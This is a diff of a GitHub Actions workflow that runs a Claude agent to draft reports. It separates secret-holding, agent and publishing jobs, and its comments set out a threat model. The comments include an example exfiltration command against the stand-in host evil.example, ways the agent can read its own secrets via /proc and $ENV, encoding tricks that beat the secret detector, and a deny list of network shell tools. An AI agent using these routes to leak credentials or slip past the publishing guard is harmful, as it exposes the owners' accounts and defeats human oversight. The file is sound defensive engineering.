@@ -1,6 +1,6 @@
 name: agent report
 
-# Shared worker for the three recurring report jobs (weekly / monthly /
+# Shared worker for the four recurring report jobs (weekly / marketing / monthly /
 # quarterly-prep, work order G4.2–4). They differ only in schedule, prompt and
 # tool scope, so everything else lives here once and they call it.
 # Not callable on its own: `workflow_call` only.
@@ -43,14 +43,16 @@ name: agent report
 #
 # THE AGENT CAN READ ITS OWN ENVIRONMENT, and no deny list changes that: the shell
 # expands `$VAR` inside the arguments of any ALLOWED command, `gh`'s own `--jq` is gojq
-# and implements `$ENV`, and `head`/`tail`/`cut`/`sort` read `/proc/self/environ` as
-# happily as the denied `cat` does. `env`, `printenv`, `/proc`, `jq`, `awk` and `find`
-# are denied to remove the obvious paths, not because that closes the class.
+# and implements `$ENV`, and `head`/`tail`/`cut` read `/proc/self/environ` as happily as
+# the denied `cat` does. `env`, `printenv`, `/proc`, `jq`, `awk`, `find` and `sort` are
+# denied to remove the obvious paths, not because that closes the class.
 #
-# So the design assumes the agent may learn a secret, and takes away every way to send
-# one (ADR 0048):
-#   - it cannot publish: `gh issue create/comment/edit/close/reopen/…` are denied, and
-#     it writes `report.md` for a later step to publish instead;
+# So the design assumes the agent may learn a secret, and narrows the ways to send one
+# (ADR 0048). It does not close them: the report itself can carry an encoded value, and so
+# can the public step summary below. What it does:
+#   - it cannot publish: its job's token is `issues: read` (ADR 0073), `gh issue
+#     create/comment/edit/close/reopen/…` are denied as well, and it writes `report.md`
+#     for the `publish` job to publish instead;
 #   - it can write files, but not the ones that matter: `.git/` is denied because git runs
 #     `diff.external`/`textconv` THROUGH THE SHELL on an allowed `git log -p` / `git show`,
 #     which would be arbitrary execution; `.github/`, `.claude/`, `scripts/` and `supabase/`
@@ -61,15 +63,32 @@ name: agent report
 #     `Write(/**)` as an extra deny, which matches the RESOLVED path of `report.md` and, since
 #     deny beats allow, forbids the one file the agent exists to produce. Do not reintroduce
 #     either. The write is therefore a plain `Write` grant, and the containment is: nothing
-#     the agent writes is published except through the vetting step below;
-#   - it cannot reach the runner's own file commands: `GITHUB_STEP_SUMMARY` (rendered
-#     publicly), `GITHUB_ENV`, `GITHUB_PATH` and `GITHUB_OUTPUT` are pointed at /dev/null
-#     for the agent step. An allowed command plus a shell redirect would otherwise write
-#     them, so scoping `Write` alone is not enough. The action's own job summary is the
-#     deliberate price; the run log still has it.
+#     the agent writes is published except through the vetting in the `publish` job;
+#   - `gh` reads cannot name another host: `gh issue view https://evil.example/$TOKEN/x/issues/1`
+#     sends its argument to that host, so URLs, `-R` and `--repo` are denied. A pattern, and
+#     quoting may beat it; the real fix is to stop giving these agents `gh` at all (plan,
+#     follow-ups);
 #   - `report-guard.py` then refuses to publish a report containing a secret's value.
 #     A detector, not a boundary: an encoded value passes it.
-# `permissions: contents: read` and the prompt's hard rule are the other two layers.
+# The runner's file commands stay open to it. A step's env cannot point them elsewhere: the
+# runner's ScriptHandler writes the real paths over it. So the agent can write the public step
+# summary unvetted, and GITHUB_ENV and GITHUB_PATH reach the post steps of its own job. Neither
+# reaches `publish`.
+#
+# THREE JOBS, BECAUSE NOTHING ON THE AGENT'S RUNNER CAN BE TRUSTED AFTER IT RAN (ADR 0073). The agent
+# has a shell, so a step after it inherits what it left: git config and hooks, Python's user site,
+# `~/.jq`, a copy in $RUNNER_TEMP, an env file. Hardening those is a list that never ends, so:
+#   snapshot — no agent, no public text. The only job naming the Google, Meta and Google Business
+#     secrets, on its own runner, before the agent exists. Its files are scanned for those values and
+#     handed over as an artifact: public, like every artifact here, one day long, holding the totals
+#     and the scrubbed free text the snapshot wrote.
+#   report — the agent. Its token reads, and it holds no `id-token: write`: a Claude step that is
+#     given `github_token` makes no OIDC call, and that grant could be exchanged for the Claude
+#     App's write token. After the agent, one fixed step with no secret passes `report.md` on as
+#     a base64 job output, the hand-off video-guidelines-refresh.yml uses. Not an artifact: this
+#     text is unvetted, and the run log masks secrets where an artifact does not.
+#   publish — no agent, a fresh runner, the issue write. It vets and publishes. Its step env is
+#     printed in the run log, so the report sits there as base64 even when it is withheld.
 
 on:
   workflow_call:
@@ -80,10 +99,9 @@ on:
         type: string
       allowed_tools:
         description: >
-          --allowedTools value. Read-only commands plus `Write(report.md)` — the agent's
-          only write, and not a network one (ADR 0048). MUST be a literal in the caller,
-          never a value derived from event data — it is interpolated into the CLI
-          argument line.
+          --allowedTools value. Read-only commands plus a plain `Write`, the agent's only
+          write and not a network one (ADR 0048). MUST be a literal in the caller, never a
+          value derived from event data — it is interpolated into the CLI argument line.
         required: true
         type: string
       # A RUNAWAY GUARD, not a budget. The action fails the job when Claude finishes
@@ -102,6 +120,19 @@ on:
       label:
         required: true
         type: string
+      analytics:
+        description: Write the GA4 + Search Console snapshot. The weekly turns it off, it reads none of it.
+        required: false
+        type: boolean
+        default: true
+      marketing_numbers:
+        description: >
+          The marketing report's inputs (ADR 0073): the deep analytics read, the per-post numbers kept
+          as the `post-days` artifact, the content freshness file and the native channel numbers. Only
+          marketing-report sets it, and only that caller passes the Meta and Google Business secrets.
+        required: false
+        type: boolean
+        default: false
     secrets:
       # A Claude subscription token from `claude setup-token`, not an API key (ADR 0042).
       claude_code_oauth_token:
@@ -110,25 +141,127 @@ on:
       # only (ADR 0047). Rotated at the 2027-01-01 review.
       google_sa_key:
         required: false
+      # Meta Page token and Google Business OAuth, read by the social snapshot only (ADR 0073).
+      # Rotated at the 2027-01-01 review. Missing ones print `n/a`, nothing fails.
+      meta_access_token:
+        required: false
+      gbp_client_id:
+        required: false
+      gbp_client_secret:
+        required: false
+      gbp_refresh_token:
+        required: false
 
+# Each job states its own, below.
 permissions:
   contents: read
-  issues: write
-  # The action mints its token through GitHub's OIDC endpoint and fails without
-  # this ("Could not fetch an OIDC token"). It is NOT a repo-write grant: it only
-  # lets the job request an identity token. The `github_token` input below is
-  # what the action actually uses for GitHub API calls, so the job's own scoped
-  # token — contents:read + issues:write — stays the ceiling.
-  id-token: write
 
 jobs:
-  report:
+  # Runs for each report that reads analytics. No agent ever runs here, and nothing here reads
+  # public issue text: it is the only job that names the snapshot credentials.
+  snapshot:
+    if: inputs.analytics
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      # GA4 + Search Console snapshot (ADR 0047). Read-only against Google; exits 0 on every error
+      # with the reason in the file, so a Google hiccup costs a `n/a` line, not the report. `node` is
+      # the runner's (>= 18 is enough). `shell: bash` for pipefail — without it the pipe hides a
+      # non-zero exit and a script that crashed outright would look like a clean run with no numbers.
+      # continue-on-error keeps that visible (a red step) without costing the report.
+      - name: Analytics snapshot (GA4 + Search Console)
+        continue-on-error: true
+        shell: bash
+        env:
+          GOOGLE_SA_KEY: ${{ secrets.google_sa_key }}
+          ANALYTICS_MARKETING: ${{ inputs.marketing_numbers && '1' || '' }}
+        run: node scripts/analytics-snapshot.mjs | tee -a "$GITHUB_STEP_SUMMARY"
+
+      # Freshness numbers from the content records — no credential, no network (content PR D).
+      - name: Content freshness
+        if: inputs.marketing_numbers
+        continue-on-error: true
+        shell: bash
+        run: node scripts/content-freshness.mjs | tee -a "$GITHUB_STEP_SUMMARY"
+
+      # Native channel numbers (ADR 0073). Same contract as the analytics step.
+      - name: Social snapshot (Meta + Google Business)
+        if: inputs.marketing_numbers
+        continue-on-error: true
+        shell: bash
+        env:
+          META_ACCESS_TOKEN: ${{ secrets.meta_access_token }}
+          GBP_CLIENT_ID: ${{ secrets.gbp_client_id }}
+          GBP_CLIENT_SECRET: ${{ secrets.gbp_client_secret }}
+          GBP_REFRESH_TOKEN: ${{ secrets.gbp_refresh_token }}
+        run: node scripts/social-snapshot.mjs | tee -a "$GITHUB_STEP_SUMMARY"
+
+      # Before the files leave this job. A hit fails it and nothing is uploaded: the report then
+      # prints `n/a`, and a red snapshot job says why. A detector on whole values, and it runs after
+      # the status lines above reached the summary: reason() in scripts/lib/scrub.mjs is what keeps a
+      # token out of the text.
+      - name: Scan the files for the credentials
+        shell: bash
+        env:
+          SCAN_GOOGLE: ${{ secrets.google_sa_key }}
+          SCAN_META: ${{ secrets.meta_access_token }}
+          SCAN_GBP_SECRET: ${{ secrets.gbp_client_secret }}
+          SCAN_GBP_REFRESH: ${{ secrets.gbp_refresh_token }}
+        run: |
+          set -euo pipefail
+          shopt -s nullglob
+          for file in .reports/*.json; do python3 -I scripts/report-guard.py --scan-only "$file"; done
+
+      # The snapshot's per-post file feeds each post record's `results:` (content PR D):
+      # content-week downloads this artifact with `gh run download` and scripts/post-results.mjs
+      # writes the totals, so no key ever reaches a session. The repo is public and so are its
+      # artifacts: the file holds daily totals only, for campaigns that are post IDs (ADR 0047,
+      # ADR 0069 §3), and lives 8 days: one content session reads it.
+      - name: Keep the per-post numbers for the content session
+        if: inputs.marketing_numbers
+        continue-on-error: true
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: post-days
+          path: .reports/post-days.json
+          include-hidden-files: true
+          retention-days: 8 # one session reads it; each run makes its own
+          if-no-files-found: ignore
+
+      - name: Hand the numbers to the report job
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: reports
+          path: |
+            .reports/analytics.json
+            .reports/freshness.json
+            .reports/social.json
+          include-hidden-files: true
+          retention-days: 1
+          if-no-files-found: warn
+
+  report:
+    needs: snapshot
+    # `needs` would skip this job when the snapshot is skipped (the weekly) or failed; a failed
+    # snapshot costs `n/a` lines, and its own red job says why.
+    if: ${{ !cancelled() }}
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: read
+    outputs:
+      ready: ${{ steps.key.outputs.ready }}
+      report: ${{ steps.handoff.outputs.report }}
     steps:
       # fetch-depth 0: every one of these reports reads merge history over a
       # period, which a shallow clone does not contain.
-      # Pinned to commit SHAs, not tags: these two run upstream of `GOOGLE_SA_KEY`
-      # (checkout supplies the very script that receives it), and a tag can be moved.
+      # Pinned to commit SHAs, not tags: a tag can be moved, and checkout supplies the
+      # scripts that run next to the secrets.
       # Dependabot's github-actions ecosystem keeps the SHAs current.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -157,25 +290,17 @@ jobs:
             echo 'ready=true' >> "$GITHUB_OUTPUT"
           fi
 
-      # GA4 + Search Console snapshot (ADR 0047) — the ONLY step that names
-      # `google_sa_key`: GitHub exposes a secret to the steps that reference it, so the
-      # agent below never has it in its environment and just Reads the file. Read-only
-      # against Google; exits 0 on every error with the reason in the file, so a Google
-      # hiccup costs a `n/a` line, not the report. `node` is the runner's (>= 18 is
-      # enough), not the agent's — Bash(node *) stays denied below.
-      # `shell: bash` for pipefail — without it the pipe hides a non-zero exit and a
-      # script that crashed outright would look like a clean run with no numbers.
-      # continue-on-error keeps that visible (a red step) without costing the report.
-      - name: Analytics snapshot (GA4 + Search Console)
-        if: steps.key.outputs.ready == 'true'
+      # The snapshot job's files; the agent only Reads them. A miss costs `n/a` lines.
+      - name: Take the numbers from the snapshot job
+        if: steps.key.outputs.ready == 'true' && inputs.analytics
         continue-on-error: true
-        shell: bash
-        env:
-          GOOGLE_SA_KEY: ${{ secrets.google_sa_key }}
-        run: node scripts/analytics-snapshot.mjs | tee -a "$GITHUB_STEP_SUMMARY"
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
+        with:
+          name: reports
+          path: .reports
 
       - if: steps.key.outputs.ready == 'true'
-        uses: anthropics/claude-code-action@6c690188da61cf16ee7debb28383ba67f02abb4c # v1
+        uses: anthropics/claude-code-action@db77d4d3c98f3f6380e7cd45ffba2342a3dbde3c # v1
         with:
           claude_code_oauth_token: ${{ secrets.claude_code_oauth_token }}
           github_token: ${{ secrets.GITHUB_TOKEN }}
@@ -188,50 +313,25 @@ jobs:
             --model claude-sonnet-5
             --max-turns ${{ inputs.max_turns }}
             --allowedTools "${{ inputs.allowed_tools }}"
-            --disallowedTools "Read(//proc/**),Read(//etc/**),Read(~/.claude/**),Bash(env),Bash(env *),Bash(printenv),Bash(printenv *),Bash(cat /proc/*),Bash(grep * /proc/*),Bash(set),Bash(export),Bash(node *),Bash(npx *),Bash(npm *),Bash(python3 *),Bash(python *),Bash(deno *),Bash(curl *),Bash(wget *),Bash(nc *),Bash(ssh *),Bash(eval *),Bash(git push *),Bash(gh api *),Bash(gh pr merge *),Bash(gh secret *),Bash(gh workflow *),Bash(supabase *),Bash(dtctl *),Bash(bluebox *),Bash(jq *),Bash(awk *),Bash(find *),Bash(gh issue create *),Bash(gh issue comment *),Bash(gh issue edit *),Bash(gh issue close *),Bash(gh issue reopen *),Bash(gh issue delete *),Bash(gh issue lock *),Bash(gh issue unlock *),Bash(gh issue pin *),Bash(gh issue unpin *),Bash(gh issue transfer *),Bash(gh issue develop *),Bash(gh pr comment *),Bash(gh pr close *),Bash(gh pr reopen *),Bash(gh pr review *),Bash(gh pr edit *),Bash(gh pr merge *),Bash(gh gist *),Bash(gh release *),Bash(gh label *),Bash(gh alias *),Bash(gh config *),Bash(gh repo *),Bash(gh auth *),Edit,NotebookEdit,WebFetch,WebSearch,Write(.github/**),Write(.claude/**),Write(scripts/**),Write(supabase/**),Write(.git/**)"
+            --disallowedTools "Read(//proc/**),Read(//etc/**),Read(~/.claude/**),Bash(env),Bash(env *),Bash(printenv),Bash(printenv *),Bash(cat /proc/*),Bash(grep * /proc/*),Bash(set),Bash(export),Bash(node *),Bash(npx *),Bash(npm *),Bash(python3 *),Bash(python *),Bash(deno *),Bash(curl *),Bash(wget *),Bash(nc *),Bash(ssh *),Bash(eval *),Bash(git push *),Bash(gh api *),Bash(gh pr merge *),Bash(gh secret *),Bash(gh workflow *),Bash(supabase *),Bash(dtctl *),Bash(bluebox *),Bash(jq *),Bash(awk *),Bash(find *),Bash(sort *),Bash(gh issue create *),Bash(gh issue comment *),Bash(gh issue edit *),Bash(gh issue close *),Bash(gh issue reopen *),Bash(gh issue delete *),Bash(gh issue lock *),Bash(gh issue unlock *),Bash(gh issue pin *),Bash(gh issue unpin *),Bash(gh issue transfer *),Bash(gh issue develop *),Bash(gh pr comment *),Bash(gh pr close *),Bash(gh pr reopen *),Bash(gh pr review *),Bash(gh pr edit *),Bash(gh pr merge *),Bash(gh gist *),Bash(gh release *),Bash(gh label *),Bash(gh alias *),Bash(gh config *),Bash(gh repo *),Bash(gh auth *),Bash(gh * *://*),Bash(gh * -R*),Bash(gh * --repo*),Edit,NotebookEdit,WebFetch,WebSearch,Write(.github/**),Write(.claude/**),Write(scripts/**),Write(supabase/**),Write(.git/**)"
         env:
           # The agent no longer opens issues; it still reads them to build the report.
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          # The runner's file commands are a write surface reachable by any allowed
-          # command with a shell redirect — GITHUB_STEP_SUMMARY renders on a PUBLIC run
-          # page, GITHUB_ENV and GITHUB_PATH feed the step that holds the tokens.
-          GITHUB_STEP_SUMMARY: /dev/null
-          GITHUB_ENV: /dev/null
-          GITHUB_PATH: /dev/null
-          GITHUB_OUTPUT: /dev/null
           BASH_ENV: ''
 
-      # The agent writes `report.md`; THIS step publishes it. That split is the point
-      # (roadmap item 14): the agent holds no network write at all, so text it was
-      # talked into producing — by a public issue, or by attacker-influenced analytics
-      # values — has nowhere to go but a file a fixed script inspects first.
-      #
-      # It is not a complete boundary. The agent can still read its own environment
-      # (`$VAR` expands in any allowed command's arguments; `gh --jq` is gojq with
-      # `$ENV`), so it could write a secret INTO the report. That is what the redaction
-      # check below is for: if a secret's value appears in the report, nothing is
-      # published and the run goes red. Encodings would defeat a literal match — this
-      # raises the cost and makes the naive attempt loud, it does not eliminate it.
-      - name: Publish the report
+      # The agent writes `report.md`; the `publish` job publishes it. That split is the point
+      # (roadmap item 14): text it was talked into producing — by a public issue, or by
+      # attacker-influenced analytics values — has nowhere to go but a file a fixed script
+      # inspects first. This step runs after the agent, so it holds no secret and is not
+      # hardened. The file is capped because the next job reads it through an environment
+      # variable, and Linux refuses one past 128 KB of base64. The reports are English and far
+      # smaller. A value GitHub masks is dropped from the output, base64 forms included.
+      - name: Hand the report to the publish job
+        id: handoff
         if: steps.key.outputs.ready == 'true'
         shell: bash
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          LABEL: ${{ inputs.label }}
-          # Read ONLY to be redacted. Both are values the agent could have reached.
-          SCAN_OAUTH: ${{ secrets.claude_code_oauth_token }}
-          SCAN_GH: ${{ secrets.GITHUB_TOKEN }}
-          # Not in the agent's environment by design — watched anyway, since the agent
-          # does read the analytics snapshot this key produced.
-          SCAN_GOOGLE: ${{ secrets.google_sa_key }}
         run: |
           set -euo pipefail
-          # The agent had a shell in this workspace. `Write(scripts/**)` is denied, but an
-          # ALLOWED command with a redirect (`head -c 1 x > scripts/report-guard.py`) is
-          # not a Write-tool call and never meets that rule — so restore the vetting
-          # script from the commit before running it. Without this line the "deterministic"
-          # step could be running agent-authored Python next to the scanned secrets.
-          git checkout HEAD -- scripts/report-guard.py
           if [ ! -s report.md ]; then
             # Say what IS there: "no report" twice cost two 8-minute runs to diagnose.
             echo 'The agent produced no report.md — nothing to publish. Workspace root:'
@@ -239,10 +339,54 @@ jobs:
             echo 'The agent produced no report.md — nothing to publish.' >> "$GITHUB_STEP_SUMMARY"
             exit 1
           fi
+          if [ "$(wc -c < report.md)" -gt 90000 ]; then
+            echo 'report.md is over 90 KB — not a weekly report. Nothing to publish.' | tee -a "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+          encoded=$(base64 -w0 report.md)
+          echo "report=$encoded" >> "$GITHUB_OUTPUT"
+
+  # No agent ever ran on this runner, so what the agent left behind is not here: only its text,
+  # as data. It is not a complete boundary: the agent can read its own environment (`$VAR`
+  # expands in any allowed command's arguments; `gh --jq` is gojq with `$ENV`), so it could
+  # write a secret INTO the report. That is what the check below is for: if a secret's value
+  # appears in the report, the issue gets nothing and the run goes red. Encodings would defeat a
+  # literal match — this raises the cost and makes the naive attempt loud, it does not
+  # eliminate it. `ready` is false with no Claude token, so that run stays green.
+  publish:
+    needs: report
+    # Explicit: the implied success() would also skip this when the snapshot was skipped or failed.
+    if: ${{ !cancelled() && needs.report.result == 'success' && needs.report.outputs.ready == 'true' }}
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: write
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Publish the report
+        shell: bash
+        env:
+          REPORT_B64: ${{ needs.report.outputs.report }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          LABEL: ${{ inputs.label }}
+          # Read ONLY to be scanned for: the one value the agent could have reached that outlives
+          # its job. Its GITHUB_TOKEN died with the job. Every SCAN_* is watched by report-guard.py.
+          SCAN_OAUTH: ${{ secrets.claude_code_oauth_token }}
+        run: |
+          set -euo pipefail
+          # Empty after a good agent run means GitHub dropped the output: it held a masked secret.
+          if [ -z "$REPORT_B64" ]; then
+            echo 'Report withheld: the hand-off is empty, so it held a masked secret or never encoded. Rotate the Claude token and read the run log.' | tee -a "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+          base64 -d <<< "$REPORT_B64" > report.md
           # A secret in the report is treated as compromise, not as something to clean
           # up and ship: publishing a redacted version would hide that it happened.
-          if ! python3 scripts/report-guard.py; then
-            echo 'Report withheld — see the log. Nothing was published.' >> "$GITHUB_STEP_SUMMARY"
+          if ! python3 -I scripts/report-guard.py; then
+            echo 'Report withheld from the issue — see the log, which holds it as base64.' >> "$GITHUB_STEP_SUMMARY"
             exit 1
           fi
           # report-guard wrote title.txt and body.md. The duplicate check compares titles
